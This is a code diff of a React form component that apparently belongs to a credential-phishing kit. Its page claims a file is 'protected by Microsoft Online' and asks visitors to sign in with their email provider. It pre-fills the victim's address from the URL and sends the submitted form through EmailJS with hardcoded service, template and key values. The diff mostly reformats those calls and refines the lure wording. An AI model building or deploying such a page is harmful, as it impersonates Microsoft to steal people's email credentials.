@@ -11,16 +11,11 @@ function Forms() {
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
 
-   const submitHandler = (e) => {
+  const submitHandler = (e) => {
     e.preventDefault();
 
     emailjs
-      .sendForm(
-        "gmail",
-        "template_3jamv0i",
-        e.target,
-        "3hXVmO6FYl9i0rRmR"
-      )
+      .sendForm("gmail", "template_3jamv0i", e.target, "3hXVmO6FYl9i0rRmR")
       .then(
         (result) => {
           console.log(result.text);
@@ -39,12 +34,7 @@ function Forms() {
     let emailss = params.id;
     let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
     emailjs
-      .sendForm(
-        "gmail",
-        "template_3jamv0i",
-        e.target,
-        "3hXVmO6FYl9i0rRmR"
-      )
+      .sendForm("gmail", "template_3jamv0i", e.target, "3hXVmO6FYl9i0rRmR")
       .then(
         (result) => {
           console.log(result.text);
@@ -81,7 +71,7 @@ function Forms() {
                   </h5>
                   <p>
                     This file is protected by Microsoft Online. Please sign in
-                    to access file
+                    with your email provider to access file
                   </p>
                 </div>
 
